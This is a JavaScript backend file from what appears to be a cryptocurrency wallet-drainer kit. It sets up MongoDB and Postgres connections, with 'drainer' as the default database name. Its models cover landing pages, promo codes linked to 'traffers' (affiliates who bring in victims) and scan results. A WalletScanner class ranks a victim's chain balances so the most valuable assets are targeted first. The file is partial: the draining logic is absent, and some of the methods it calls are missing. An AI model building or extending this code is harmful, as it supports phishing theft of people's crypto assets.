const mongoose = require('mongoose');
const { Sequelize } = require('sequelize');
require('dotenv').config();
const ethers = require('ethers');
const { SUPPORTED_NETWORKS } = require('../config/networks');

const connectDB = async () => {
  try {
    await mongoose.connect(process.env.MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log('MongoDB connected successfully');
  } catch (error) {
    console.error('MongoDB connection error:', error);
    process.exit(1);
  }
};

const sequelize = new Sequelize(process.env.POSTGRES_URL || {
  host: process.env.DB_HOST || 'localhost',
  port: process.env.DB_PORT || 5432,
  database: process.env.DB_NAME || 'drainer',
  username: process.env.DB_USER || 'postgres',
  password: process.env.DB_PASS || '',
  dialect: 'postgres',
  logging: false
});

const models = {
  User: require('./models/user')(sequelize),
  PromoCode: require('./models/promoCode')(sequelize),
  Landing: require('./models/landing')(sequelize),
  Transaction: require('./models/transaction')(sequelize),
  ScanResult: require('./models/scanResult')(sequelize),
  Statistics: require('./models/statistics')(sequelize)
};

// Define associations (example)
models.User.hasMany(models.PromoCode, { foreignKey: 'trafferId' });
models.PromoCode.belongsTo(models.User, { foreignKey: 'trafferId' });

async function connectDBPostgres() {
  try {
    await sequelize.authenticate();
    // sync only in dev; use migrations in production
    await sequelize.sync({ alter: process.env.NODE_ENV !== 'production' });
    console.log('Postgres connected and models synced');
  } catch (err) {
    console.error('Postgres connection error:', err);
    process.exit(1);
  }
}

class WalletScanner {
  constructor() {
    this.providers = {};
    this.initializeProviders();
  }

  initializeProviders() {
    for (const network of SUPPORTED_NETWORKS) {
      this.providers[network.chainId] = new ethers.providers.JsonRpcProvider(network.rpc);
    }
  }

  async scanWallet(address) {
    const results = [];
    
    for (const network of SUPPORTED_NETWORKS) {
      const balance = await this.providers[network.chainId].getBalance(address);
      
      if (balance.gt(0)) {
        const tokens = await this.getTokens(address, network.chainId);
        const nfts = await this.getNFTs(address, network.chainId);
        
        results.push({
          network: network.name,
          chainId: network.chainId,
          balance: ethers.utils.formatEther(balance),
          tokens,
          nfts
        });
      }
    }

    // Sort networks by total value
    return results.sort((a, b) => b.balance - a.balance);
  }

  // Additional methods for token scanning will be implemented here
}

module.exports = { connectDB, connectDBPostgres, WalletScanner: new WalletScanner() };